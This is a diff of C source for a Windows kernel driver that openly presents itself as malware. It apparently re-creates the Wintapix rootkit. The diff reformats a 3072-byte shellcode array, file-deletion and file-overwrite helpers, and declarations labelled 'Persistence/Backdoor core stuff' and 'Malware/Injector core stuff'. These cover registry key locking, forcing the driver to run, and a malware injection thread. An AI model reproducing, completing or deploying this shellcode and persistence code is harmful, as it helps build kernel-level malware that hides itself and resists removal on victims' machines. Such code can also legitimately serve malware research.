@@ -22,7 +22,8 @@ Copyright (c) Fluxuss Software Security, LLC
 HANDLE g_hThread;
 HANDLE g_hThreadPersist;
 
-unsigned char g_ucMyShellcode[3072] = {
+unsigned char g_ucMyShellcode[ 3072 ] = {
+
 	0x4C, 0x6F, 0x61, 0x64, 0x4C, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x41,
 	0x00, 0x00, 0x00, 0x00, 0x6B, 0x00, 0x65, 0x00, 0x72, 0x00, 0x6E, 0x00,
 	0x65, 0x00, 0x6C, 0x00, 0x33, 0x00, 0x32, 0x00, 0x2E, 0x00, 0x64, 0x00,
@@ -279,55 +280,93 @@ unsigned char g_ucMyShellcode[3072] = {
 	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
 	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
 	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+
 };
 
 // Persistence/Backdoor core stuff
 
-typedef NTSTATUS(NTAPI* _NtLockRegistryKey)(
+typedef NTSTATUS( NTAPI* _NtLockRegistryKey )(
+
 	_In_ HANDLE KeyHandle
+
 );
 
 _NtLockRegistryKey NtLockRegistryKey;
 
-typedef NTSTATUS (NTAPI* _NtNotifyChangeDirectoryFile)(
-	HANDLE, 
-	HANDLE, 
-	PIO_APC_ROUTINE, 
-	PVOID, 
-	PIO_STATUS_BLOCK, 
-	PVOID, 
-	ULONG, 
-	ULONG, 
-	BOOLEAN
+typedef NTSTATUS ( NTAPI* _NtNotifyChangeDirectoryFile )(
+
+	_In_ HANDLE, 
+	_In_ HANDLE,
+	_In_ PIO_APC_ROUTINE,
+	_In_ PVOID,
+	_Out_ PIO_STATUS_BLOCK, 
+	_Out_ PVOID,
+	_In_ ULONG,
+	_In_ ULONG,
+	_In_ BOOLEAN
+
 );
 
 _NtNotifyChangeDirectoryFile NtNotifyChangeDirectoryFile;
 
 IO_STATUS_BLOCK g_IoStatusBlock;
 
-BOOLEAN compare_unicode_string_2(const WCHAR* wchWintapixName, const WCHAR* wchFileName, ULONG fileNameLength) {
+BOOLEAN compare_unicode_string_2(
+	
+	_In_ const WCHAR* wchWintapixName,
+	_In_ const WCHAR* wchFileName,
+	_In_ ULONG fileNameLength
+
+) {
 
 	UNICODE_STRING uniStrCurrentFileName;
 	UNICODE_STRING uniStrFileName;
 
-	memset(&uniStrFileName, 0, sizeof(uniStrFileName));
-	memset(&uniStrCurrentFileName, 0, sizeof(uniStrCurrentFileName));
+	memset( _Out_ &uniStrFileName, _In_ 0, _In_ sizeof( uniStrFileName ) );
 
-	RtlInitUnicodeString(&uniStrFileName, wchWintapixName);
-	RtlInitUnicodeString(&uniStrCurrentFileName, wchFileName);
+	memset( _Out_ &uniStrCurrentFileName, _In_ 0, _In_ sizeof( uniStrCurrentFileName ) );
 
-	uniStrCurrentFileName.Length = (USHORT)fileNameLength;
+	RtlInitUnicodeString( 
+		
+		_Out_ &uniStrFileName,
+		_In_ wchWintapixName
+	
+	);
+	
+	RtlInitUnicodeString(
+		
+		_Out_ &uniStrCurrentFileName,
+		_In_ wchFileName
+	
+	);
 
-	return RtlCompareUnicodeString(&uniStrFileName, &uniStrCurrentFileName, 1u) == 0;
+	uniStrCurrentFileName.Length = ( USHORT )fileNameLength;
+
+	return RtlCompareUnicodeString(
+		
+		_In_ &uniStrFileName,
+		_In_ &uniStrCurrentFileName,
+		_In_ 1
+
+	) == 0;
 }
 
-NTSTATUS delete_file(const WCHAR* wchFileName) {
+NTSTATUS delete_file(
+	
+	_In_ const WCHAR* wchFileName
+
+) {
 
 	UNICODE_STRING uniStrFileName;
 
 	OBJECT_ATTRIBUTES ObjectAttributes;
 
-	RtlInitUnicodeString(&uniStrFileName, wchFileName);
+	RtlInitUnicodeString(
+		
+		_Out_ &uniStrFileName,
+		_In_ wchFileName
+	
+	);
 
 	ObjectAttributes.Length = 48;
 	ObjectAttributes.RootDirectory = 0i64;
@@ -336,19 +375,34 @@ NTSTATUS delete_file(const WCHAR* wchFileName) {
 	ObjectAttributes.SecurityDescriptor = 0i64;
 	ObjectAttributes.SecurityQualityOfService = 0i64;
 
-	return ZwDeleteFile(&ObjectAttributes);
+	return ZwDeleteFile(
+		
+		_In_ &ObjectAttributes
+	
+	);
 }
 
-NTSTATUS override_file_with_buffer(const WCHAR* wchFileName, void* pBuffer, ULONG szBuffer) {
+NTSTATUS override_file_with_buffer(
+	
+	_In_ const WCHAR* wchFileName, 
+	_In_ void* pBuffer,
+	_In_ ULONG szBuffer
+
+) {
 
 	IO_STATUS_BLOCK IoStatusBlock;
 	UNICODE_STRING uniStrFileName;
 	OBJECT_ATTRIBUTES ObjectAttributes;
 	HANDLE hFile;
 
-	memset(&IoStatusBlock, 0, sizeof(IoStatusBlock));
+	memset( _Out_ &IoStatusBlock, _In_ 0, _In_ sizeof( IoStatusBlock ) );
 
-	RtlInitUnicodeString(&uniStrFileName, wchFileName);
+	RtlInitUnicodeString(
+		
+		_Out_ &uniStrFileName,
+		_In_ wchFileName
+	
+	);
 	
 	ObjectAttributes.Length = 48;
 	ObjectAttributes.RootDirectory = 0i64;
@@ -357,47 +411,146 @@ NTSTATUS override_file_with_buffer(const WCHAR* wchFileName, void* pBuffer, ULON
 	ObjectAttributes.SecurityDescriptor = 0i64;
 	ObjectAttributes.SecurityQualityOfService = 0i64;
 
-	NTSTATUS status = ZwCreateFile(&hFile, 0x40000000u, &ObjectAttributes, &IoStatusBlock, 0i64, 0x80u, 1u, 2u, 0x20u, 0i64, 0);
-
-	if (NT_SUCCESS(status)) {
-		memset(&IoStatusBlock, 0, sizeof(IoStatusBlock));
-
-		status = ZwWriteFile(hFile, 0i64, 0i64, 0i64, &IoStatusBlock, pBuffer, szBuffer, 0i64, 0i64);
+	NTSTATUS status = ZwCreateFile(
 		
-		ZwClose(hFile);
+		_Out_ &hFile,
+		_In_ 0x40000000,
+		_In_ &ObjectAttributes,
+		_Out_ &IoStatusBlock,
+		_In_opt_ 0,
+		_In_ 0x80,
+		_In_ 1,
+		_In_ 2,
+		_In_ 0x20,
+		_In_ 0,
+		_In_ 0
+	
+	);
+
+	if ( NT_SUCCESS( status ) ) {
+		memset( _Out_ &IoStatusBlock, _In_ 0, _In_ sizeof( IoStatusBlock ) );
+
+		status = ZwWriteFile(
+			
+			_Out_ hFile,
+			_In_ 0,
+			_In_ 0,
+			_Out_ 0,
+			_In_opt_ &IoStatusBlock,
+			_In_ pBuffer,
+			_In_ szBuffer,
+			_In_ 0,
+			_In_ 0
+		
+		);
+		
+		ZwClose(
+			
+			_In_ hFile
+		
+		);
 	}
 
 	return status;
 }
 
-__int64 query_file_information_get_file_size(const WCHAR* wchFileName);
+__int64 query_file_information_get_file_size(
+	
+	_In_ const WCHAR* wchFileName
 
-NTSTATUS create_kernel_mode_file(const WCHAR* wchWintapixPath);
+);
 
-NTSTATUS wrap_read_file(const WCHAR* wchFileName, PVOID* pBuffer, SIZE_T* szBuffer);
+NTSTATUS create_kernel_mode_file(
+	
+	_In_ const WCHAR* wchWintapixPath
 
-NTSTATUS wrap_persistence_thread_main(const WCHAR* wchWintapixPath, const WCHAR* wchWintapixPath2, const WCHAR* wchWintapixName);
+);
 
-void persistence_thread(PVOID StartContext);
+NTSTATUS wrap_read_file(
+	
+	_In_ const WCHAR* wchFileName,
+	_In_ PVOID* pBuffer,
+	_In_ SIZE_T* szBuffer
 
-NTSTATUS notify_registry_key_change(const WCHAR* wchWintapixRegisty);
+);
 
-NTSTATUS set_registry_key_value_2(void* handle, const WCHAR* key, int value);
+NTSTATUS wrap_persistence_thread_main(
+	
+	_In_ const WCHAR* wchWintapixPath,
+	_In_ const WCHAR* wchWintapixPath2,
+	_In_ const WCHAR* wchWintapixName
 
-NTSTATUS set_registry_key_value(void* handle, const WCHAR* key, void* value);
+);
 
-NTSTATUS garant_driver_run(const WCHAR* wchRegistyKey);
+void persistence_thread(
+	
+	_In_ PVOID StartContext
 
-NTSTATUS Lock_Registy_Key(const WCHAR* wchRegistyKey);
+);
 
-NTSTATUS persistence_stuff_main();
+NTSTATUS notify_registry_key_change(
+	
+	_In_ const WCHAR* wchWintapixRegisty
+
+);
+
+NTSTATUS set_registry_key_value_2(
+	
+	_In_ void* handle,
+	_In_ const WCHAR* key,
+	_In_ int value
+
+);
+
+NTSTATUS set_registry_key_value(
+	
+	_In_ void* handle,
+	_In_ const WCHAR* key,
+	_In_ void* value
+
+);
+
+NTSTATUS garant_driver_run(
+	
+	_In_ const WCHAR* wchRegistyKey
+
+);
+
+NTSTATUS Lock_Registy_Key(
+	
+	_In_ const WCHAR* wchRegistyKey
+
+);
+
+NTSTATUS persistence_stuff_main(
+	
+	void
+
+);
 
 //Malware/Injector core stuff
 
-NTSTATUS SetThreadDelay(signed int siDelayTime);
+NTSTATUS SetThreadDelay(
+	
+	_In_ signed int siDelayTime
 
-void ThreadMalware(PVOID StartContext);
+);
 
-NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath);
+void ThreadMalware(
+	
+	_In_ PVOID StartContext
 
-VOID UnloadDriver(PDRIVER_OBJECT pDriverObject);
+);
+
+NTSTATUS DriverEntry(
+	
+	_In_ PDRIVER_OBJECT pDriverObject,
+	_In_ PUNICODE_STRING pRegistryPath
+
+);
+
+VOID UnloadDriver(
+	
+	_In_ PDRIVER_OBJECT pDriverObject
+
+);
